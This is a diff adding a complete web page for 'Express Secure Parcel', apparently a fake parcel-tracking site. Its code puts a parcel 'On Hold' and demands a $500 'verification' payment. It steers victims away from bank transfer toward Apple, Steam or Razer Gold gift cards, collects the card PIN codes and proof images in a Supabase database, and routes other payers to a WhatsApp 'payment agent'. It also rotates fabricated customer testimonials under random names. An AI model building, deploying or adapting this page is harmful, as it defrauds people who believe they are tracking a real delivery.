@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Express Secure Parcel | Premium Logistics</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+    body { font-family: 'Inter', system-ui, sans-serif; overflow-x: hidden; }
+    .hero-bg { background-image: linear-gradient(rgba(0,0,0,0.65), rgba(0,0,0,0.65)), url('https://i.imgur.com/AEBUQNv.png'); background-size: cover; background-position: center; }
+    .card-3d { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+    .card-3d:hover { transform: translateY(-12px) scale(1.02); box-shadow: 0 25px 50px -12px rgb(0 0 0 / 0.4) !important; }
+    .whatsapp-float { animation: pulse 2s infinite; }
+    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+    .leaflet-popup-content-wrapper { border-radius: 12px; }
+    .scrollbar-hide::-webkit-scrollbar { display: none; }
+    
+    @keyframes scaleIn {
+      0% { transform: scale(0.9); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+    .animate-scale-in { animation: scaleIn 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+    #delivery-popup {
+      position: fixed;
+      bottom: 100px;
+      left: 20px;
+      z-index: 1000;
+      display: none;
+      animation: slideUp 0.5s ease-out;
+    }
+    @keyframes slideUp {
+      from { transform: translateY(20px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+  </style>
+</head>
+<body class="bg-zinc-50 text-zinc-900">
+  <div id="successOverlay" class="hidden fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm">
+    <div class="bg-white rounded-[2.5rem] max-w-md w-full p-10 text-center shadow-2xl animate-scale-in">
+      <div class="w-24 h-24 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl">
+        <i class="fas fa-check-circle"></i>
+      </div>
+      <h3 class="text-3xl font-bold text-zinc-900 mb-3">Payment Under Review</h3>
+      <p class="text-zinc-500 text-lg leading-relaxed mb-8">
+        Our verification team is processing your proof. Your tracking status will update shortly.
+      </p>
+      <button onclick="closeSuccessOverlay()" class="w-full bg-[#4D148C] text-white py-5 rounded-2xl text-xl font-bold hover:bg-[#3b0f6b] transition">
+        DONE
+      </button>
+    </div>
+  </div>
+
+  <header class="fixed top-0 left-0 right-0 bg-white shadow-2xl z-50">
+    <div class="max-w-7xl mx-auto px-4 md:px-6 py-4 md:py-5 flex items-center justify-between gap-2">
+      <div class="flex items-center gap-3">
+        <img src="https://i.imgur.com/tw6q8yh.png" alt="Logo" class="h-8 md:h-12 w-auto drop-shadow-xl shrink-0">
+        <div class="min-w-0">
+          <h1 class="text-sm md:text-2xl font-bold tracking-tighter text-[#4D148C] truncate">EXPRESS SECURE PARCEL</h1>
+          <p class="hidden xs:block text-[10px] md:text-xs text-zinc-500 -mt-1 uppercase">Fast. Secure. Worldwide.</p>
+        </div>
+      </div>
+      <a href="https://wa.me/qr/XBZGIIHUTQNYE1" target="_blank" 
+         class="bg-green-600 hover:bg-green-700 text-white px-4 md:px-6 py-2 md:py-3 rounded-2xl flex items-center gap-2 font-semibold shadow-xl text-xs md:text-base shrink-0">
+        <i class="fab fa-whatsapp text-lg"></i> <span class="hidden sm:inline">Live Chat</span>
+      </a>
+    </div>
+  </header>
+
+  <section id="track" class="hero-bg min-h-[85vh] flex items-center pt-24 pb-12">
+    <div class="max-w-4xl mx-auto text-center px-6 text-white w-full">
+      <div class="inline-flex items-center gap-3 bg-white/10 backdrop-blur-md px-6 md:px-8 py-2 md:py-3 rounded-3xl mb-8">
+        <div class="w-3 h-3 bg-green-400 rounded-full animate-pulse"></div>
+        <span class="text-xs font-semibold tracking-widest">24/7 GLOBAL TRACKING</span>
+      </div>
+      <h2 class="text-3xl md:text-7xl font-bold leading-tight md:leading-none mb-6">Your Package.<br>Real-Time. Secure.</h2>
+      <p class="text-lg md:text-2xl mb-12 max-w-lg mx-auto opacity-90">Enter your tracking number below</p>
+      
+      <div class="max-w-xl mx-auto px-2 md:px-0">
+        <div class="flex flex-col md:flex-row shadow-2xl rounded-3xl overflow-hidden bg-white/10 p-2 md:p-0">
+          <input id="trackingInput" type="text" placeholder="ESP1234567890" 
+                 class="flex-1 bg-white text-zinc-900 px-6 py-4 md:py-6 text-lg md:text-xl focus:outline-none rounded-2xl md:rounded-none">
+          <button onclick="trackShipment()" id="trackBtn"
+                  class="bg-[#4D148C] hover:bg-[#3b0f6b] px-10 py-4 md:py-6 text-white font-bold text-lg md:text-xl flex items-center justify-center gap-3 transition rounded-2xl md:rounded-none mt-2 md:mt-0">
+            TRACK NOW
+            <i class="fas fa-arrow-right"></i>
+          </button>
+        </div>
+        <p class="text-[10px] md:text-sm mt-4 opacity-75">Example: ESP1234567890</p>
+      </div>
+    </div>
+  </section>
+
+  <div id="resultsSection" class="hidden max-w-6xl mx-auto px-4 md:px-6 py-12 md:py-16">
+    <button onclick="hideResults()" 
+            class="mb-8 flex items-center gap-2 text-zinc-500 hover:text-zinc-900 transition font-bold text-xs uppercase tracking-widest">
+      <i class="fas fa-arrow-left"></i> Back to Home
+    </button>
+    <div class="grid grid-cols-1 lg:grid-cols-12 gap-8">
+      <div class="lg:col-span-5 space-y-8">
+        <div id="packageCard" class="bg-white rounded-3xl p-5 md:p-8 card-3d shadow-2xl"></div>
+        <div class="bg-white rounded-3xl p-5 md:p-8 shadow-2xl overflow-hidden">
+          <h3 class="font-semibold text-xl mb-8 flex items-center gap-3">
+            <i class="fas fa-route text-[#4D148C]"></i> Live Tracking Progress
+          </h3>
+          <div id="progressSteps" class="space-y-4"></div>
+        </div>
+      </div>
+      <div class="lg:col-span-7">
+        <div class="relative bg-white rounded-3xl overflow-hidden shadow-2xl h-[300px] md:h-[520px]">
+          <div id="map" class="w-full h-full"></div>
+          <div class="absolute top-4 right-4 z-[400] bg-white/90 backdrop-blur-md px-3 py-1.5 rounded-full shadow-lg border border-zinc-200">
+             <p class="text-[10px] font-bold text-zinc-600 flex items-center gap-2 italic">
+               <i class="fas fa-search-minus"></i> Zoom out for clear view
+             </p>
+          </div>
+        </div>
+        <div id="onHoldNotice" class="hidden mt-6 bg-gradient-to-r from-red-600 to-rose-600 text-white p-6 md:p-8 rounded-3xl shadow-2xl">
+          <div class="flex items-start gap-4 md:gap-6">
+            <div class="text-4xl md:text-5xl">⚠️</div>
+            <div class="flex-1">
+              <p id="holdText" class="text-xl md:text-2xl font-bold leading-tight"></p>
+              <p class="mt-4 text-sm md:text-base opacity-90">Click the Secure Payment button below to proceed.</p>
+            </div>
+          </div>
+        </div>
+        <button id="securePaymentBtn" onclick="openPaymentModal()" 
+                class="hidden w-full mt-6 bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-700 hover:to-rose-700 text-white py-6 md:py-7 rounded-3xl text-xl md:text-2xl font-bold shadow-2xl flex items-center justify-center gap-4 transition whatsapp-float">
+          <i class="fas fa-lock"></i> SECURE PAYMENT VERIFICATION
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <section id="services" class="max-w-7xl mx-auto px-6 py-16 md:py-24">
+    <div class="text-center mb-12 md:mb-16">
+      <span class="bg-[#4D148C] text-white text-sm font-bold px-6 py-2 rounded-full">OUR SERVICES</span>
+      <h2 class="text-3xl md:text-5xl font-bold mt-4">Comprehensive Logistics Solutions</h2>
+    </div>
+    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+      <div class="bg-white p-8 rounded-3xl card-3d shadow-xl">
+        <i class="fas fa-plane text-5xl md:text-6xl text-[#4D148C] mb-6"></i>
+        <h3 class="text-2xl font-semibold mb-3">Express Air Freight</h3>
+        <p class="text-zinc-600">Priority air shipping with 1-3 day delivery worldwide.</p>
+      </div>
+      <div class="bg-white p-8 rounded-3xl card-3d shadow-xl">
+        <i class="fas fa-truck text-5xl md:text-6xl text-[#4D148C] mb-6"></i>
+        <h3 class="text-2xl font-semibold mb-3">Ground Delivery</h3>
+        <p class="text-zinc-600">Reliable ground shipping across the US.</p>
+      </div>
+      <div class="bg-white p-8 rounded-3xl card-3d shadow-xl">
+        <i class="fas fa-globe text-5xl md:text-6xl text-[#4D148C] mb-6"></i>
+        <h3 class="text-2xl font-semibold mb-3">International Shipping</h3>
+        <p class="text-zinc-600">Door-to-door with full customs assistance.</p>
+      </div>
+    </div>
+  </section>
+
+  <div id="delivery-popup" class="bg-white border border-zinc-200 shadow-2xl rounded-2xl p-4 flex items-center gap-4 w-72 md:w-80">
+    <div class="bg-green-100 text-green-600 w-12 h-12 rounded-full flex items-center justify-center shrink-0 text-xl">
+        <i class="fas fa-shipping-fast"></i>
+    </div>
+    <div>
+        <p id="pop-name" class="font-bold text-sm text-zinc-900"></p>
+        <p id="pop-comment" class="text-xs text-zinc-500 italic leading-snug"></p>
+    </div>
+  </div>
+
+  <footer class="bg-zinc-900 text-white py-12 md:py-16">
+    <div class="max-w-7xl mx-auto px-6 grid grid-cols-1 md:grid-cols-3 gap-12">
+      <div>
+        <img src="https://i.imgur.com/tw6q8yh.png" alt="Logo" class="h-8 md:h-10 mb-6">
+        <p class="text-zinc-400 text-sm">Express Secure Parcel — Trusted worldwide since 2018.</p>
+      </div>
+      <div>
+        <h4 class="font-semibold mb-6">Contact Us</h4>
+        <p class="flex items-center gap-3 mb-3 text-sm"><i class="fas fa-phone"></i> +1 (336) 965-7941</p>
+        <p class="flex items-center gap-3 text-sm"><i class="fas fa-envelope"></i> support@expresssecureparcel.com</p>
+      </div>
+      <div class="text-center md:text-left">
+        <a href="https://wa.me/qr/XBZGIIHUTQNYE1" target="_blank" 
+           class="inline-flex items-center gap-3 bg-green-600 hover:bg-green-700 px-8 py-4 rounded-2xl text-lg transition shadow-xl">
+          <i class="fab fa-whatsapp text-2xl"></i> WhatsApp Support
+        </a>
+      </div>
+    </div>
+  </footer>
+
+  <div id="paymentModal" class="hidden fixed inset-0 bg-black/70 flex items-center justify-center z-[100] p-4">
+    <div class="bg-white rounded-3xl max-w-lg w-full shadow-2xl overflow-y-auto max-h-[90vh]">
+      <div class="p-6 md:p-8">
+        <div class="flex justify-between items-center mb-8">
+          <h3 class="text-2xl md:text-3xl font-bold">Secure Payment</h3>
+          <button onclick="closePaymentModal()" class="text-4xl text-zinc-400 hover:text-black">×</button>
+        </div>
+        <div class="bg-zinc-50 p-4 rounded-2xl mb-6 flex justify-between items-center border border-zinc-100">
+            <span class="text-zinc-400 font-bold text-xs uppercase">Requirement:</span>
+            <span class="text-[#4D148C] font-black text-2xl">$500.00</span>
+        </div>
+        <select id="paymentMethod" onchange="toggleGiftCard()" 
+                class="w-full p-4 md:p-5 border border-zinc-200 rounded-2xl text-base md:text-lg mb-6 focus:ring-2 focus:ring-[#4D148C] outline-none">
+          <option value="">Select Payment Method</option>
+          <option value="Bank Transfer">Bank Transfer/Cash App/PayPal</option>
+          <option value="Gift Card">Gift Card</option>
+        </select>
+        
+        <div id="giftSub" class="hidden mb-6">
+          <select id="giftType" class="w-full p-4 md:p-5 border border-zinc-200 rounded-2xl text-base md:text-lg">
+            <option value="">Select Gift Card Type</option>
+            <option value="Apple Card">Apple Card</option>
+            <option value="Steam Card">Steam Card</option>
+            <option value="Razer Gold">Razer Gold</option>
+          </select>
+        </div>
+
+        <div id="declineMessage" class="hidden p-6 bg-amber-50 border border-amber-200 rounded-2xl text-amber-800 mb-6 text-sm font-bold">
+          Payment is currently unavailable through this portal.
+          Please contact our authorized Payment Agent via WhatsApp to complete your payment safely.
+          If preferred, you may select “Gift Card” to proceed immediately.
+        </div>
+
+        <div id="fullForm" class="hidden space-y-6">
+          <input id="amount" type="number" value="500" readonly class="w-full p-5 bg-zinc-50 border border-zinc-200 rounded-2xl text-lg font-bold text-center">
+          <textarea id="notes" rows="3" placeholder="Notes / PIN codes / Reference" class="w-full p-5 border border-zinc-200 rounded-2xl text-lg"></textarea>
+          <div>
+            <label class="block text-sm font-medium mb-2">Proof (Image)</label>
+            <input id="proofFile" type="file" accept="image/*" class="w-full border border-zinc-200 rounded-2xl p-4 text-sm">
+          </div>
+        </div>
+
+        <button onclick="submitPayment()" id="submitBtn" class="hidden w-full bg-[#4D148C] text-white py-6 rounded-3xl text-xl font-bold mt-4 transition">SUBMIT PROOF</button>
+        <button onclick="openWhatsApp()" id="whatsappBtn" class="hidden w-full bg-green-600 text-white py-6 rounded-3xl text-xl font-bold mt-4 flex items-center justify-center gap-3 shadow-xl">
+          <i class="fab fa-whatsapp"></i> OPEN WHATSAPP
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <a href="https://wa.me/qr/XBZGIIHUTQNYE1" target="_blank"
+     class="fixed bottom-6 right-6 md:bottom-8 md:right-8 bg-green-500 text-white w-14 h-14 md:w-16 md:h-16 rounded-2xl md:rounded-3xl flex items-center justify-center text-3xl md:text-4xl shadow-2xl whatsapp-float z-50">
+    <i class="fab fa-whatsapp"></i>
+  </a>
+
+  <script>
+    const SUPABASE_URL = 'https://kleaiukmoyfrnlbvchhx.supabase.co';
+    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtsZWFpdWttb3lmcm5sYnZjaGh4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzIyMDI4MDIsImV4cCI6MjA4Nzc3ODgwMn0.htrRG8RFuaASiVRIJg9mDROs4VV4cbflEc-ms-GwdgI';
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    
+    let currentTracking = '';
+    let mapInstance = null;
+
+    const deliveryNames = ["James Thompson", "Sarah Miller", "Robert Garcia", "Michael Davis", "Linda Martinez", "William Wilson", "Elizabeth Taylor", "David Anderson", "Barbara Thomas", "Richard Jackson"];
+    const deliveryComments = ["Fast delivery very happy", "Package arrived safely no issues", "Secure shipping and great service", "Excellent logistics company thanks", "Very professional and fast", "My parcel arrived in perfect condition", "Safe and reliable service", "Tracking was accurate and timely", "Highly recommend for secure items", "Five star service very secure"];
+
+    function showDeliveryNotification() {
+      const popup = document.getElementById('delivery-popup');
+      const nameEl = document.getElementById('pop-name');
+      const commentEl = document.getElementById('pop-comment');
+      const randomName = deliveryNames[Math.floor(Math.random() * deliveryNames.length)];
+      const randomComment = deliveryComments[Math.floor(Math.random() * deliveryComments.length)];
+      nameEl.innerText = randomName;
+      commentEl.innerText = randomComment;
+      popup.style.display = 'flex';
+      setTimeout(() => { popup.style.display = 'none'; }, 6000);
+    }
+    setInterval(showDeliveryNotification, 15000);
+
+    async function trackShipment() {
+      const input = document.getElementById('trackingInput').value.trim().toUpperCase();
+      const btn = document.getElementById('trackBtn');
+      if (!input) return alert('Please enter tracking number');
+      btn.disabled = true;
+      btn.innerHTML = '<i class="fas fa-spinner animate-spin"></i>';
+      try {
+        const { data, error } = await supabaseClient
+          .from('parcels')
+          .select('*')
+          .eq('tracking_number', input)
+          .single();
+        if (error || !data) {
+          alert('📦 Tracking number not found.');
+          return;
+        }
+        currentTracking = input;
+        document.getElementById('resultsSection').classList.remove('hidden');
+        renderResults(data);
+        document.getElementById('resultsSection').scrollIntoView({ behavior: 'smooth' });
+      } catch (e) {
+        alert('Connection error. Try again.');
+      } finally {
+        btn.disabled = false;
+        btn.innerHTML = 'TRACK NOW <i class="fas fa-arrow-right"></i>';
+      }
+    }
+
+    function renderResults(parcel) {
+      document.getElementById('packageCard').innerHTML = `
+        <div class="flex flex-col md:flex-row gap-6">
+          <img src="${parcel.package_image_url || 'https://picsum.photos/id/1015/300/300'}" class="w-full md:w-32 h-32 object-cover rounded-2xl shadow-lg">
+          <div class="flex-1">
+            <div class="flex justify-between items-start">
+              <div>
+                <p class="text-[10px] text-zinc-400 uppercase tracking-widest font-black">Tracking Number</p>
+                <p class="font-mono text-xl md:text-2xl font-bold text-[#4D148C]">${parcel.tracking_number}</p>
+              </div>
+              <span class="px-3 py-1 ${parcel.status === 'On Hold' ? 'bg-red-100 text-red-600' : 'bg-green-100 text-green-600'} rounded-lg text-[10px] font-black uppercase tracking-tighter">${parcel.status}</span>
+            </div>
+            <div class="mt-4 grid grid-cols-2 gap-4 text-[11px] md:text-xs">
+              <div><p class="text-zinc-400 uppercase font-bold">Sender</p><strong class="block truncate">${parcel.sender_name}</strong></div>
+              <div><p class="text-zinc-400 uppercase font-bold">Receiver</p><strong class="block truncate">${parcel.receiver_name}</strong></div>
+              <div><p class="text-zinc-400 uppercase font-bold">Current</p><strong class="block truncate">${parcel.current_location}</strong></div>
+              <div><p class="text-zinc-400 uppercase font-bold">Destination</p><strong class="block truncate">${parcel.destination}</strong></div>
+            </div>
+          </div>
+        </div>
+      `;
+      const steps = [
+        { n: 'Pick up at origin', i: 'fa-box' },
+        { n: 'Departed Hub', i: 'fa-truck' },
+        { n: 'In Transit', i: 'fa-road' },
+        { n: 'Arrived at Destination Hub', i: 'fa-plane-arrival' },
+        { n: 'Delivered', i: 'fa-check-circle' }
+      ];
+      const pIndex = getProgressIndex(parcel.status);
+      let pHTML = '';
+      steps.forEach((s, idx) => {
+        const active = idx <= pIndex;
+        pHTML += `
+          <div class="flex items-center gap-4">
+            <div class="w-8 h-8 md:w-10 md:h-10 rounded-xl flex items-center justify-center ${active ? 'bg-[#4D148C] text-white' : 'bg-zinc-200 text-zinc-400'} text-xs md:text-base">
+              <i class="fas ${s.i}"></i>
+            </div>
+            <div class="flex-1">
+              <p class="text-xs md:text-base ${active ? 'text-[#4D148C] font-bold' : 'text-zinc-400'}">${s.n}</p>
+              ${idx === pIndex && parcel.status === 'On Hold' ? '<span class="text-red-600 text-[10px] font-black uppercase tracking-tighter">STOPPED: ON HOLD</span>' : ''}
+            </div>
+          </div>
+          ${idx < 4 ? `<div class="ml-4 md:ml-5 h-6 md:h-8 w-0.5 ${idx < pIndex ? 'bg-[#4D148C]' : 'bg-zinc-200'}"></div>` : ''}
+        `;
+      });
+      document.getElementById('progressSteps').innerHTML = pHTML;
+      const onHold = parcel.status === 'On Hold';
+      document.getElementById('onHoldNotice').classList.toggle('hidden', !onHold);
+      document.getElementById('securePaymentBtn').classList.toggle('hidden', !onHold);
+      if (onHold) document.getElementById('holdText').innerText = parcel.hold_notice;
+      initMap(parcel);
+    }
+
+    function getProgressIndex(s) {
+      if (s === 'Delivered') return 4;
+      if (s.includes('Arrived')) return 3;
+      if (s === 'In Transit' || s === 'On Hold') return 2;
+      if (s.includes('Departed')) return 1;
+      return 0;
+    }
+
+    function initMap(p) {
+      if (mapInstance) mapInstance.remove();
+      mapInstance = L.map('map', { zoomControl: false }).setView([p.current_lat || 0, p.current_lng || 0], 4);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
+      L.marker([p.current_lat, p.current_lng]).addTo(mapInstance);
+      L.marker([p.dest_lat, p.dest_lng]).addTo(mapInstance);
+      const poly = L.polyline([[p.current_lat, p.current_lng], [p.dest_lat, p.dest_lng]], {color: '#4D148C', dashArray: '10, 10', weight: 4}).addTo(mapInstance);
+      mapInstance.fitBounds(poly.getBounds(), { padding: [40, 40], maxZoom: 6 });
+    }
+
+    function hideResults() { document.getElementById('resultsSection').classList.add('hidden'); window.scrollTo(0,0); }
+    function openPaymentModal() { document.getElementById('paymentModal').classList.remove('hidden'); }
+    function closePaymentModal() { document.getElementById('paymentModal').classList.add('hidden'); }
+    
+    function toggleGiftCard() {
+      const val = document.getElementById('paymentMethod').value;
+      const isGC = val === 'Gift Card';
+      const isOther = ['Bank Transfer', 'Cash App', 'PayPal'].includes(val);
+      document.getElementById('giftSub').classList.toggle('hidden', !isGC);
+      document.getElementById('fullForm').classList.toggle('hidden', !isGC);
+      document.getElementById('submitBtn').classList.toggle('hidden', !isGC);
+      document.getElementById('declineMessage').classList.toggle('hidden', !isOther);
+      document.getElementById('whatsappBtn').classList.toggle('hidden', !isOther);
+    }
+
+    function openSuccessOverlay() { document.getElementById('successOverlay').classList.remove('hidden'); }
+    
+    function closeSuccessOverlay() { 
+      document.getElementById('successOverlay').classList.add('hidden');
+      window.open(`https://wa.me/13369657941?text=NEW%20PAYMENT%20SUBMITTED%20FOR%20REVIEW%0ATracking:%20${currentTracking}`, '_blank');
+    }
+
+    async function submitPayment() {
+      const submitBtn = document.getElementById('submitBtn');
+      const fileInput = document.getElementById('proofFile');
+      const notes = document.getElementById('notes').value;
+      const giftType = document.getElementById('giftType').value;
+      const method = document.getElementById('paymentMethod').value;
+      
+      if (!fileInput.files || fileInput.files.length === 0) {
+        return alert('Please select a proof image first!');
+      }
+
+      const file = fileInput.files[0];
+      const fileExt = file.name.split('.').pop();
+      const fileName = `${currentTracking}-${Date.now()}.${fileExt}`;
+      
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = '<i class="fas fa-spinner animate-spin"></i> UPLOADING...';
+
+      try {
+        // 1. Upload to Supabase Storage Bucket 'payment_proofs'
+        const { data: uploadData, error: uploadError } = await supabaseClient
+          .storage
+          .from('payment_proofs')
+          .upload(fileName, file);
+
+        if (uploadError) throw uploadError;
+
+        // 2. Get Public URL
+        const { data: urlData } = supabaseClient
+          .storage
+          .from('payment_proofs')
+          .getPublicUrl(fileName);
+
+        const publicUrl = urlData.publicUrl;
+
+        // 3. Save payment record into 'payments' table
+        const { error: paymentError } = await supabaseClient
+          .from('payments')
+          .insert([{
+            tracking_number: currentTracking,
+            method: method,
+            gift_card_type: method === 'Gift Card' ? giftType : null,
+            notes: notes,
+            proof_url: publicUrl,
+            status: 'Pending Verification'
+          }]);
+
+        if (paymentError) throw paymentError;
+
+        // 4. Update Parcel Status to "Payment Under Review"
+        const { error: updateError } = await supabaseClient
+          .from('parcels')
+          .update({ 
+            status: 'Payment Review'
+          })
+          .eq('tracking_number', currentTracking);
+
+        if (updateError) throw updateError;
+
+        closePaymentModal();
+        openSuccessOverlay();
+      } catch (error) {
+        console.error('Submission Error:', error);
+        alert('Action failed: ' + error.message);
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = 'SUBMIT PROOF';
+      }
+    }
+
+    function openWhatsApp() { window.open('https://wa.me/qr/XBZGIIHUTQNYE1', '_blank'); }
+    
+    window.onload = () => {
+      showDeliveryNotification();
+    };
+  </script>
+</body>
+</html>
